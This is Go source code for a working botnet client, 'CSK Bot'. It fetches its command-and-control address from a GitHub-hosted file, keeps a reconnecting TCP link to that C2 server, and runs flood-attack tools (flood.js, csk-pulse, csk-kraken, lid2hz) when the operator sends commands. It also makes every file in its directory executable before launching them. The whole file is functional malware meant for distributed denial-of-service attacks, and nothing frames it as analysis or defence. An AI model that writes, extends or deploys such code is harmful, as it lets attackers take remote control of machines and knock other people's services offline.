package main

import (
	"bufio"
	"context"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

const (
	// Raw GitHub URL - không có rate limit 60/h như API
	CONFIG_URL      = "https://raw.githubusercontent.com/tenkhongvps1-ctrl/autocallport/refs/heads/main/port.txt"
	CONFIG_INTERVAL = 30 * time.Second
	HTTP_TIMEOUT    = 10 * time.Second
	RECONNECT_DELAY = 5 * time.Second
	READ_TIMEOUT    = 15 * time.Second
)

var configRegex = regexp.MustCompile(`cnc:\s*([^\s]+)\s+port:\s*(\d+)`)

// ==================== STRUCT ====================

type CSKBot struct {
	// Config runtime
	configMu    sync.RWMutex
	currentHost string
	currentPort int

	// Connection
	client         net.Conn
	isConnected    bool
	isReconnecting bool

	// Process management
	activeProcesses map[int]*exec.Cmd
	processMutex    sync.Mutex

	// Reconnect timer
	reconnectMu    sync.Mutex
	reconnectTimer *time.Timer

	// Điều khiển vòng lặp config
	stopConfigChan chan struct{}
}

func NewCSKBot() *CSKBot {
	return &CSKBot{
		isConnected:     false,
		isReconnecting:  false,
		activeProcesses: make(map[int]*exec.Cmd),
		stopConfigChan:  make(chan struct{}),
	}
}

// ==================== CONFIG FETCHER ====================

func (bot *CSKBot) startConfigFetcher() {
	go func() {
		// Fetch lần đầu ngay
		bot.fetchAndUpdateConfig()

		ticker := time.NewTicker(CONFIG_INTERVAL)
		defer ticker.Stop()

		for {
			select {
			case <-ticker.C:
				bot.fetchAndUpdateConfig()
			case <-bot.stopConfigChan:
				log.Println("[Config] Fetcher stopped.")
				return
			}
		}
	}()
}

func (bot *CSKBot) fetchAndUpdateConfig() {
	ctx, cancel := context.WithTimeout(context.Background(), HTTP_TIMEOUT)
	defer cancel()

	// Cache-buster để tránh CDN cache của raw.githubusercontent.com
	cacheBuster := time.Now().UnixNano()
	url := fmt.Sprintf("%s?_t=%d", CONFIG_URL, cacheBuster)

	req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
	if err != nil {
		log.Printf("[Config] Failed to create request: %v", err)
		return
	}
	req.Header.Set("User-Agent", "CSK-Worker/1.0")
	req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
	req.Header.Set("Pragma", "no-cache")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		log.Printf("[Config] Fetch error: %v", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		log.Printf("[Config] Unexpected status: %d", resp.StatusCode)
		return
	}

	body, err := io.ReadAll(io.LimitReader(resp.Body, 4096))
	if err != nil {
		log.Printf("[Config] Read error: %v", err)
		return
	}

	content := strings.TrimSpace(string(body))

	newHost, newPort, ok := parseConfig(content)
	if !ok {
		log.Printf("[Config] Invalid format: %q", content)
		return
	}

	// So sánh với config hiện tại
	bot.configMu.RLock()
	oldHost := bot.currentHost
	oldPort := bot.currentPort
	bot.configMu.RUnlock()

	if oldHost == newHost && oldPort == newPort {
		return // không đổi
	}

	log.Printf("[Config] Update: %s:%d -> %s:%d", oldHost, oldPort, newHost, newPort)

	bot.configMu.Lock()
	bot.currentHost = newHost
	bot.currentPort = newPort
	bot.configMu.Unlock()

	bot.forceReconnect()
}

// parseConfig đọc nội dung file, hỗ trợ cả format 1 dòng lẫn nhiều dòng
func parseConfig(content string) (string, int, bool) {
	// Thử regex trước (format 1 dòng)
	if m := configRegex.FindStringSubmatch(content); len(m) == 3 {
		p, err := strconv.Atoi(m[2])
		if err == nil && p > 0 && p <= 65535 {
			return m[1], p, true
		}
	}

	// Fallback: parse từng dòng
	var host string
	var port int
	for _, line := range strings.Split(content, "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "cnc:") {
			host = strings.TrimSpace(strings.TrimPrefix(line, "cnc:"))
		} else if strings.HasPrefix(line, "port:") {
			p, err := strconv.Atoi(strings.TrimSpace(strings.TrimPrefix(line, "port:")))
			if err == nil {
				port = p
			}
		}
	}
	if host != "" && port > 0 && port <= 65535 {
		return host, port, true
	}
	return "", 0, false
}

func (bot *CSKBot) getConfig() (string, int) {
	bot.configMu.RLock()
	defer bot.configMu.RUnlock()
	return bot.currentHost, bot.currentPort
}

// forceReconnect: ngắt kết nối cũ, kết nối lại với config mới
func (bot *CSKBot) forceReconnect() {
	// Hủy timer reconnect cũ
	bot.reconnectMu.Lock()
	if bot.reconnectTimer != nil {
		bot.reconnectTimer.Stop()
		bot.reconnectTimer = nil
	}
	bot.reconnectMu.Unlock()

	// Đóng kết nối hiện tại
	if bot.client != nil {
		bot.client.Close()
		bot.client = nil
	}

	bot.isConnected = false
	bot.isReconnecting = false

	bot.connect()
}

// ==================== CONNECT ====================

func (bot *CSKBot) connect() {
	if bot.isConnected || bot.isReconnecting {
		return
	}

	host, port := bot.getConfig()
	if host == "" || port == 0 {
		log.Println("[Connect] No config yet, waiting for first fetch...")
		bot.scheduleReconnect()
		return
	}

	bot.isReconnecting = true
	addr := fmt.Sprintf("%s:%d", host, port)
	log.Printf("Attempting to connect to C2 server %s...", addr)

	conn, err := net.DialTimeout("tcp", addr, 15*time.Second)
	if err != nil {
		log.Printf("Failed to connect: %v", err)
		bot.isReconnecting = false
		bot.scheduleReconnect()
		return
	}

	bot.client = conn
	bot.isConnected = true
	bot.isReconnecting = false

	// Hủy timer reconnect cũ
	bot.reconnectMu.Lock()
	if bot.reconnectTimer != nil {
		bot.reconnectTimer.Stop()
		bot.reconnectTimer = nil
	}
	bot.reconnectMu.Unlock()

	log.Printf("Connected to C2 server %s", addr)

	if tcpConn, ok := conn.(*net.TCPConn); ok {
		tcpConn.SetKeepAlive(true)
		tcpConn.SetKeepAlivePeriod(30 * time.Second)
		tcpConn.SetNoDelay(true)
	}

	go bot.readCommands()
}

func (bot *CSKBot) readCommands() {
	reader := bufio.NewReader(bot.client)

	for {
		bot.client.SetReadDeadline(time.Now().Add(READ_TIMEOUT))

		data, err := reader.ReadString('\n')
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				continue
			}
			log.Printf("Connection error: %v", err)
			bot.handleDisconnect()
			return
		}

		commands := strings.Split(strings.TrimSpace(data), "\n")
		for _, command := range commands {
			command = strings.TrimSpace(command)
			if command != "" {
				bot.executeCommand(command)
			}
		}
	}
}

// ==================== COMMAND EXECUTION ====================

func (bot *CSKBot) executeCommand(command string) {
	if command == "" {
		return
	}

	if strings.HasPrefix(command, "stop") {
		bot.handleStopCommand(command)
		return
	}

	parts := strings.Fields(command)
	if len(parts) == 0 {
		return
	}

	method := strings.ToLower(parts[0])
	args := parts[1:]

	var scriptToRun string
	var isExecutable bool

	switch method {
	case "csk-tsunami":
		scriptToRun = "flood.js"
	case "csk-pulse":
		scriptToRun = "./csk-pulse"
		isExecutable = true
	case "csk-kraken":
		scriptToRun = "./csk-kraken"
		isExecutable = true
	case "csk-deluge":
		scriptToRun = "./lid2hz"
		isExecutable = true
	default:
		log.Println("Unknown method:", method)
		return
	}

	if _, err := os.Stat(scriptToRun); os.IsNotExist(err) {
		log.Println("Script not found:", scriptToRun)
		return
	}

	bot.chmodAllInCwd()

	log.Printf("Executing: %s with args: %v", method, args)
	bot.runScript(scriptToRun, args, isExecutable)
}

func (bot *CSKBot) chmodAllInCwd() {
	entries, err := os.ReadDir(".")
	if err != nil {
		log.Printf("[Chmod] ReadDir error: %v", err)
		return
	}
	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		name := e.Name()
		if err := os.Chmod(name, 0755); err != nil {
			log.Printf("[Chmod] %s failed: %v", name, err)
		} else {
			log.Printf("[Chmod] +x %s", name)
		}
	}
}

func (bot *CSKBot) handleStopCommand(command string) {
	parts := strings.Fields(command)
	if len(parts) < 2 {
		bot.stopAllProcesses()
		return
	}

	stopMethod := parts[1]
	log.Printf("Stop command received for: %s", stopMethod)
	bot.stopAllProcesses()
}

func (bot *CSKBot) stopAllProcesses() {
	bot.processMutex.Lock()
	defer bot.processMutex.Unlock()

	for pid, cmd := range bot.activeProcesses {
		if cmd.Process != nil {
			if err := cmd.Process.Kill(); err != nil {
				log.Printf("Error stopping process %d: %v", pid, err)
			} else {
				log.Printf("Stopped process PID: %d", pid)
			}
		}
		delete(bot.activeProcesses, pid)
	}
}

func (bot *CSKBot) runScript(scriptToRun string, args []string, isExecutable bool) {
	var cmd *exec.Cmd

	if isExecutable {
		cmd = exec.Command(scriptToRun, args...)
	} else {
		cmdArgs := append([]string{scriptToRun}, args...)
		cmd = exec.Command("node", cmdArgs...)
	}

	cmd.Stdout = nil
	cmd.Stderr = nil
	cmd.Stdin = nil

	if err := cmd.Start(); err != nil {
		log.Printf("Error running script: %v", err)
		return
	}

	pid := cmd.Process.Pid
	log.Printf("Started process PID: %d", pid)

	bot.processMutex.Lock()
	bot.activeProcesses[pid] = cmd
	bot.processMutex.Unlock()

	go func() {
		err := cmd.Wait()

		bot.processMutex.Lock()
		delete(bot.activeProcesses, pid)
		bot.processMutex.Unlock()

		if err != nil {
			log.Printf("Process %d exited with error: %v", pid, err)
		} else {
			log.Printf("Process %d exited successfully", pid)
		}
	}()
}

// ==================== DISCONNECT & RECONNECT ====================

func (bot *CSKBot) handleDisconnect() {
	log.Println("Connection to C2 server closed")
	bot.isConnected = false
	bot.isReconnecting = false

	if bot.client != nil {
		bot.client.Close()
		bot.client = nil
	}

	bot.scheduleReconnect()
}

func (bot *CSKBot) scheduleReconnect() {
	bot.reconnectMu.Lock()
	defer bot.reconnectMu.Unlock()

	if bot.reconnectTimer != nil {
		return
	}

	log.Println("Scheduling reconnect in 5 seconds...")
	bot.reconnectTimer = time.AfterFunc(RECONNECT_DELAY, func() {
		bot.reconnectMu.Lock()
		bot.reconnectTimer = nil
		bot.reconnectMu.Unlock()
		bot.connect()
	})
}

// ==================== CLEANUP ====================

func (bot *CSKBot) cleanup() {
	log.Println("Cleaning up...")

	// Dừng config fetcher (chỉ đóng 1 lần)
	select {
	case <-bot.stopConfigChan:
		// đã đóng rồi
	default:
		close(bot.stopConfigChan)
	}

	bot.reconnectMu.Lock()
	if bot.reconnectTimer != nil {
		bot.reconnectTimer.Stop()
		bot.reconnectTimer = nil
	}
	bot.reconnectMu.Unlock()

	if bot.client != nil {
		bot.client.Close()
		bot.client = nil
	}

	bot.stopAllProcesses()
	bot.isConnected = false
	bot.isReconnecting = false
}

// ==================== MAIN ====================

func main() {
	log.Println("Starting CSK Bot (Go version, dynamic CNC config via raw)...")

	bot := NewCSKBot()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-sigChan
		log.Println("Received signal, shutting down...")
		bot.cleanup()
		os.Exit(0)
	}()

	// Bắt đầu fetch config mỗi 30s
	bot.startConfigFetcher()

	// Chờ fetch lần đầu hoàn tất (tối đa 10s)
	for i := 0; i < 50; i++ {
		host, port := bot.getConfig()
		if host != "" && port != 0 {
			break
		}
		time.Sleep(200 * time.Millisecond)
	}

	host, port := bot.getConfig()
	if host == "" || port == 0 {
		log.Println("No config fetched yet, will retry via reconnect schedule.")
	} else {
		log.Printf("[Main] Initial config: %s:%d", host, port)
	}

	bot.connect()

	select {}
}
